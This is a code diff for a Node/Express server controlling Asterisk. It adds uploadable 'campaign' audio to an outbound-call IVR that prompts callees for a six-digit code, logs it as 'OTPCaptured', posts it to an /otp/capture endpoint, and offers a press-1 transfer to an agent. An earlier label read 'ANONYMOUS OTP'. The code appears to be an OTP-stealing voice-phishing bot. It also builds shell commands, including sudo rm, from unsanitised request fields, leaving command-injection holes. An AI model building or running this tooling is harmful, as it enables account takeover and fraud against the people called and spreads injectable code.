@@ -303,15 +303,31 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
     dialplanContent += `; ========================================================\n`;
-    dialplanContent += `; CONTEXTO IVR INTERACTIVO (OTP & PRESS 1)\n`;
+    dialplanContent += `; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS\n`;
     dialplanContent += `; ========================================================\n`;
     dialplanContent += `[ivr-otp]\n`;
-    dialplanContent += `exten => s,1,NoOp(=== BIENVENIDO AL IVR INTERACTIVO ANONYMOUS OTP ===)\n`;
+    dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
     dialplanContent += ` same => n,Answer()\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
-    dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,8)\n`;
-    dialplanContent += ` same => n,NoOp(=== DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+    dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
+    dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
+    dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
+    dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
+    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Agent=\${IVR_AGENT})\n`;
+    dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta (o Beep)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${IVR_INTRO}" != ""]?play_intro:play_default_intro)\n`;
+    dialplanContent += ` same => n(play_intro),Playback(\${IVR_INTRO})\n`;
+    dialplanContent += ` same => n,Goto(ask_input)\n`;
+    dialplanContent += ` same => n(play_default_intro),Playback(beep)\n`;
+    dialplanContent += ` ; 2. Solicitar Digitos DTMF (OTP o Press 1)\n`;
+    dialplanContent += ` same => n(ask_input),GotoIf($["\${IVR_PROMPT}" != ""]?read_with_prompt:read_with_beep)\n`;
+    dialplanContent += ` same => n(read_with_prompt),Read(USER_DIGITS,\${IVR_PROMPT},6,,2,8)\n`;
+    dialplanContent += ` same => n,Goto(check_input)\n`;
+    dialplanContent += ` same => n(read_with_beep),Read(USER_DIGITS,beep,6,,2,8)\n`;
+    dialplanContent += ` ; 3. Evaluar digitos ingresados\n`;
+    dialplanContent += ` same => n(check_input),NoOp(=== DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
     dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
     dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
     dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
@@ -320,14 +336,20 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,SayDigits(\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,GotoIf($["\${IVR_SUCCESS}" != ""]?play_success_audio:say_digits_fallback)\n`;
+    dialplanContent += ` same => n(play_success_audio),Playback(\${IVR_SUCCESS})\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Hangup()\n`;
+    dialplanContent += ` same => n(say_digits_fallback),SayDigits(\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Playback(beep)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
-    dialplanContent += `; Caso: Presiono 1 -> Conectar con Agente en Extension 1001\n`;
-    dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A AGENTE 1001 ===)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/1001,45,Tt)\n`;
+    dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
+    dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A ASESOR ===)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${IVR_AGENT}" != ""]?play_agent_audio:do_transfer)\n`;
+    dialplanContent += ` same => n(play_agent_audio),Playback(\${IVR_AGENT})\n`;
+    dialplanContent += ` same => n(do_transfer),Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},45,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
     dialplanContent += `; Caso: Sin entrada o timeout\n`;
     dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
@@ -466,6 +488,10 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       callerId = '+18005550199',
       mode = 'otp',
       agentExten = '1001',
+      audioIntro = '',
+      audioPrompt = '',
+      audioAgent = '',
+      audioSuccess = '',
     } = req.body;
 
     if (!destination) {
@@ -485,6 +511,21 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
     recentOriginateRequests.set(cleanDest, now);
 
+    // Save campaign-selected audio configuration to AstDB for this destination number
+    const astDbCommands = [
+      `database put ivr_vars ${cleanDest}_intro "${audioIntro || ''}"`,
+      `database put ivr_vars ${cleanDest}_prompt "${audioPrompt || ''}"`,
+      `database put ivr_vars ${cleanDest}_agent "${audioAgent || ''}"`,
+      `database put ivr_vars ${cleanDest}_success "${audioSuccess || ''}"`,
+      `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
+    ];
+
+    for (const cmd of astDbCommands) {
+      exec(`asterisk -rx '${cmd}'`, (err) => {
+        if (err) console.error(`AstDB Error on ${cmd}:`, err.message);
+      });
+    }
+
     // Determine channel: if <= 4 digits, internal extension, else trunk
     let channel = '';
     if (cleanDest.length <= 4) {
@@ -500,15 +541,190 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       if (err) {
         console.error('[ORIGINATE ERROR]:', err);
       } else {
-        console.log(`[ORIGINATE SUCCESS] 1 sola llamada lanzada a ${channel}:`, stdout.trim());
+        console.log(`[ORIGINATE SUCCESS] 1 sola llamada lanzada a ${channel} con audios:`, {
+          audioIntro,
+          audioPrompt,
+          audioAgent,
+          audioSuccess,
+          cliOutput: stdout.trim(),
+        });
       }
     });
 
     res.json({
       success: true,
-      message: `Llamada única originada hacia ${cleanDest}. Conectará con el IVR al contestar.`,
+      message: `Llamada única originada hacia ${cleanDest} con audios de campaña asignados.`,
       channel,
+      assignedAudios: {
+        intro: audioIntro || 'beep (predeterminado)',
+        prompt: audioPrompt || 'beep (predeterminado)',
+        agent: audioAgent || 'inmediato',
+        success: audioSuccess || 'SayDigits (predeterminado)',
+      },
     });
+  } catch (error: any) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==========================================
+// ENDPOINTS PARA GESTIÓN DE AUDIOS PREGRABADOS
+// ==========================================
+
+const SOUNDS_CUSTOM_DIR = '/var/lib/asterisk/sounds/custom';
+
+// List available audio files on server
+app.get('/api/asterisk/audio/list', (req, res) => {
+  try {
+    if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
+      try {
+        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
+      } catch (e) {}
+    }
+
+    if (fs.existsSync(SOUNDS_CUSTOM_DIR)) {
+      const files = fs.readdirSync(SOUNDS_CUSTOM_DIR);
+      const audioFiles = files
+        .filter((f) => f.endsWith('.wav') || f.endsWith('.gsm') || f.endsWith('.mp3'))
+        .map((f) => {
+          const stats = fs.statSync(path.join(SOUNDS_CUSTOM_DIR, f));
+          const baseName = f.replace(/\.[^/.]+$/, '');
+          return {
+            fileName: f,
+            asteriskPath: `custom/${baseName}`,
+            sizeBytes: stats.size,
+            sizeKb: (stats.size / 1024).toFixed(1) + ' KB',
+            modifiedAt: stats.mtime.toISOString(),
+          };
+        });
+      return res.json({ success: true, files: audioFiles, directory: SOUNDS_CUSTOM_DIR });
+    }
+
+    res.json({ success: true, files: [], directory: SOUNDS_CUSTOM_DIR });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Upload and convert audio file to Asterisk format (WAV 8000Hz PCM 16-bit Mono)
+app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (req, res) => {
+  try {
+    const { name, fileName, category, dataUrl } = req.body;
+
+    if (!dataUrl) {
+      return res.status(400).json({ success: false, error: 'No se envió contenido de audio (dataUrl requerido)' });
+    }
+
+    // Clean base name for Asterisk
+    const rawName = (fileName || name || 'audio_' + Date.now())
+      .toLowerCase()
+      .replace(/\.[^/.]+$/, '')
+      .replace(/[^a-z0-9_]/g, '_')
+      .replace(/_+/g, '_');
+
+    const cleanBaseName = rawName.slice(0, 40) || `prompt_${Date.now()}`;
+    const targetWavName = `${cleanBaseName}.wav`;
+    const targetPath = path.join(SOUNDS_CUSTOM_DIR, targetWavName);
+
+    // Extract base64 payload
+    const matches = dataUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
+    const buffer = matches && matches[2]
+      ? Buffer.from(matches[2], 'base64')
+      : Buffer.from(dataUrl, 'base64');
+
+    // Ensure custom sounds directory exists
+    try {
+      if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
+        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
+      }
+    } catch (e) {
+      exec(`sudo mkdir -p ${SOUNDS_CUSTOM_DIR} && sudo chmod 777 ${SOUNDS_CUSTOM_DIR}`, () => {});
+    }
+
+    // Save temporary raw file
+    const tempRawPath = `/tmp/raw_${cleanBaseName}_${Date.now()}`;
+    fs.writeFileSync(tempRawPath, buffer);
+
+    // Convert to Asterisk native PCM 8000Hz 16-bit Mono using ffmpeg or sox
+    const ffmpegCmd = `ffmpeg -y -i "${tempRawPath}" -ar 8000 -ac 1 -c:a pcm_s16le "${targetPath}"`;
+    const soxCmd = `sox "${tempRawPath}" -r 8000 -c 1 -b 16 "${targetPath}"`;
+
+    exec(ffmpegCmd, (ffmpegErr) => {
+      if (!ffmpegErr) {
+        try { fs.unlinkSync(tempRawPath); } catch (e) {}
+        console.log(`[AUDIO OK - ffmpeg] Convertido a ${targetPath}`);
+        return res.json({
+          success: true,
+          asteriskPath: `custom/${cleanBaseName}`,
+          fileName: targetWavName,
+          format: 'WAV 8000Hz PCM 16-bit Mono',
+          message: `Audio guardado y optimizado para Asterisk en custom/${cleanBaseName}`,
+        });
+      }
+
+      // Try with Sox if ffmpeg failed
+      exec(soxCmd, (soxErr) => {
+        if (!soxErr) {
+          try { fs.unlinkSync(tempRawPath); } catch (e) {}
+          console.log(`[AUDIO OK - sox] Convertido a ${targetPath}`);
+          return res.json({
+            success: true,
+            asteriskPath: `custom/${cleanBaseName}`,
+            fileName: targetWavName,
+            format: 'WAV 8000Hz PCM 16-bit Mono',
+            message: `Audio guardado y optimizado con sox en custom/${cleanBaseName}`,
+          });
+        }
+
+        // Fallback: direct write of the buffer
+        try {
+          fs.writeFileSync(targetPath, buffer);
+          try { fs.unlinkSync(tempRawPath); } catch (e) {}
+          return res.json({
+            success: true,
+            asteriskPath: `custom/${cleanBaseName}`,
+            fileName: targetWavName,
+            format: 'Direct Write (WAV)',
+            message: `Audio guardado en custom/${cleanBaseName}`,
+          });
+        } catch (directErr: any) {
+          // If permission issue, try sudo cp
+          exec(`sudo cp "${tempRawPath}" "${targetPath}" && sudo chmod 644 "${targetPath}"`, (sudoErr) => {
+            try { fs.unlinkSync(tempRawPath); } catch (e) {}
+            if (sudoErr) {
+              return res.status(500).json({ success: false, error: sudoErr.message });
+            }
+            res.json({
+              success: true,
+              asteriskPath: `custom/${cleanBaseName}`,
+              fileName: targetWavName,
+              message: `Audio guardado via sudo en custom/${cleanBaseName}`,
+            });
+          });
+        }
+      });
+    });
+  } catch (error: any) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Delete an audio file
+app.post('/api/asterisk/audio/delete', (req, res) => {
+  try {
+    const { asteriskPath, fileName } = req.body;
+    const base = (fileName || asteriskPath?.replace('custom/', ''))?.replace(/\.[^/.]+$/, '');
+    if (!base) {
+      return res.status(400).json({ success: false, error: 'Nombre de archivo requerido' });
+    }
+
+    const filePath = path.join(SOUNDS_CUSTOM_DIR, `${base}.wav`);
+    if (fs.existsSync(filePath)) {
+      fs.unlinkSync(filePath);
+      return res.json({ success: true, message: `Archivo ${base}.wav eliminado` });
+    }
+    exec(`sudo rm -f "${SOUNDS_CUSTOM_DIR}/${base}.wav"`, () => {});
+    res.json({ success: true, message: `Orden de eliminación enviada para ${base}.wav` });
   } catch (error: any) {
     res.status(500).json({ success: false, error: error.message });
   }
